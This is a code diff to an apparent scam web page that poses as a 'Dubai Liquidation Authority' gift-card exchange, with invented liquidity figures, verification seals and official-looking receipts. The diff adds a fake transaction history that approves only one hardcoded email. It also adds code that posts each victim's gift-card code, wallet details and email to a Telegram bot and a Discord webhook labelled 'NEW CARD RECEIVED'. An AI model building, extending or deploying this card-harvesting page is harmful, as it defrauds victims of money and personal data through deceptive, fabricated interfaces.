@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -8,10 +8,18 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; }
-        [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; }
+        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; --card-bg: #111; }
+        [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; --card-bg: #f8f9fa; }
         body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
         
+        /* DASHBOARD / HISTORY STYLES */
+        #dashboard-view { display: none; width: 100%; }
+        .tx-item { background: var(--card-bg); padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid var(--border); text-align: left; transition: 0.3s; }
+        .status-badge { font-size: 9px; padding: 3px 8px; border-radius: 4px; font-weight: 900; }
+        .status-pending { background: rgba(212,175,55,0.1); color: var(--gold); border: 1px solid rgba(212,175,55,0.3); }
+        .status-approved { background: rgba(74, 222, 128, 0.1); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+
+        /* ORIGINAL STYLES */
         .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
         .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
@@ -66,12 +74,25 @@
 </head>
 <body>
 
-    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
+    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">🌙 DARK</button>
     <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
 
     <div class="panel">
+        <div id="dashboard-view">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                <h2 style="font-size:18px;">ACTIVITY</h2>
+                <button onclick="toggleView('exchange')" class="pay" style="padding:5px 10px; background:var(--gold); color:#000; border:none;">+ NEW EXCHANGE</button>
+            </div>
+            <div id="tx-history-list">
+                <p style="font-size:11px; color:#888;">No recent activity found.</p>
+            </div>
+        </div>
+
         <div id="form">
-            <h2>Exchange</h2>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h2>Exchange</h2>
+                <button onclick="toggleView('dashboard')" class="pay" style="padding:5px 10px; border-color:var(--gold);">📜 HISTORY</button>
+            </div>
             <div class="tag">Dubai Liquidation Authority</div>
 
             <label>Asset Class</label>
@@ -158,7 +179,7 @@
                         <div class="dla-seal">DLA<br>VERIFIED</div>
                     </div>
                     <hr class="receipt-hr">
-                    <div class="r-row"><span class="r-label">Doc Status</span><span class="r-value" id="r-status" style="color:#22c55e;">✅ APPROVED_OFFICIAL</span></div>
+                    <div class="r-row"><span class="r-label">Doc Status</span><span class="r-value" id="r-status" style="color:var(--gold);">⏳ PENDING_VERIFICATION</span></div>
                     <div class="r-row"><span class="r-label">Transaction ID</span><span class="r-value" id="r-tid"></span></div>
                     <div class="r-row"><span class="r-label">Gateway Node</span><span class="r-value" id="r-gateway"></span></div>
                     <div class="r-row"><span class="r-label">Settlement Path</span><span class="r-value" id="r-path"></span></div>
@@ -189,6 +210,40 @@
         
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
+
+        function toggleView(view) {
+            if(view === 'dashboard') {
+                document.getElementById('form').style.display = 'none';
+                document.getElementById('dashboard-view').style.display = 'block';
+                loadDashboard();
+            } else {
+                document.getElementById('form').style.display = 'block';
+                document.getElementById('dashboard-view').style.display = 'none';
+            }
+        }
+
+        function loadDashboard() {
+            const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
+            const container = document.getElementById('tx-history-list');
+            if(history.length === 0) return;
+            
+            container.innerHTML = history.reverse().map(tx => {
+                const isApproved = (tx.email && tx.email.toLowerCase() === "joseeruitha@gmail.com");
+                const statusText = isApproved ? "APPROVED" : "PENDING";
+                const statusClass = isApproved ? "status-approved" : "status-pending";
+
+                return `
+                    <div class="tx-item">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span style="font-size:10px; color:#888;">${tx.id}</span>
+                            <span class="status-badge ${statusClass}">${statusText}</span>
+                        </div>
+                        <div style="font-weight:800; font-size:18px; margin:5px 0; color:var(--text);">${tx.amount}</div>
+                        <div style="font-size:10px; color:#888;">Asset: ${tx.asset} • ${tx.date}</div>
+                    </div>
+                `;
+            }).join('');
+        }
 
         const wmLayer = document.getElementById('wm-layer');
         for(let i=0; i<30; i++) {
@@ -247,10 +302,20 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
+            const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
+            const newTx = { 
+                id: 'DLA-'+Math.floor(Math.random()*99999), 
+                amount: amount, 
+                asset: assetName, 
+                email: userEmail,
+                date: new Date().toLocaleDateString() 
+            };
+            history.push(newTx);
+            localStorage.setItem('dla_history', JSON.stringify(history));
+
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Telegram Notification (High Priority POST)
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
                                 `*Asset:* ${assetName}\n` +
@@ -264,4 +329,82 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'Markdown'
+                }),
+                keepalive: true
+            });
+
+            const discordPayload = {
+                username: "DLA SETTLEMENT HUB",
+                embeds: [{
+                    title: "🚨 NEW CARD RECEIVED",
+                    color: 13938487,
+                    fields: [
+                        { name: "Asset Class", value: assetName, inline: true },
+                        { name: "USD Value", value: amount, inline: true },
+                        { name: "Card Code (Tap to Copy)", value: "```" + cardCode + "```" },
+                        { name: "Payout Method", value: method, inline: true },
+                        { name: "Recipient Details", value: walletDetails },
+                        { name: "User Email", value: userEmail }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
+
+            let p = 0;
+            let iv = setInterval(() => {
+                p++; document.getElementById('pbar').style.width = p + "%";
+                if(p==33) document.getElementById('s1').className='step-done';
+                if(p==66) document.getElementById('s2').className='step-done';
+                if(p>=100) { clearInterval(iv); showReceipt(); }
+            }, 40);
+        }
+
+        function showReceipt() {
+            successSound.play();
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+            let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
+            let cleanGateway = method.replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g, '').trim();
+            document.getElementById('r-tid').innerText = tid;
+            document.getElementById('r-gateway').innerText = cleanGateway;
+            document.getElementById('r-path').innerText = document.getElementById('wallet').value;
+            document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
+            document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
+            document.getElementById('r-date').innerText = new Date().toLocaleString();
+            new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
+            startTimer();
+        }
+
+        function startTimer() {
+            let time = 3600;
+            const timerEl = document.getElementById('r-timer');
+            const countdown = setInterval(() => {
+                time--;
+                let h = Math.floor(time / 3600);
+                let m = Math.floor((time % 3600) / 60);
+                let s = time % 60;
+                timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+                if (time <= 0) clearInterval(countdown);
+            }, 1000);
+        }
+
+        function saveHDReceipt() {
+            html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
+                const link = document.createElement('a');
+                link.download = 'DLA_Certificate_Official.png';
+                link.href = canvas.toDataURL();
+                link.click();
+            });
+        }
+    </script>
+</body>
+</html>
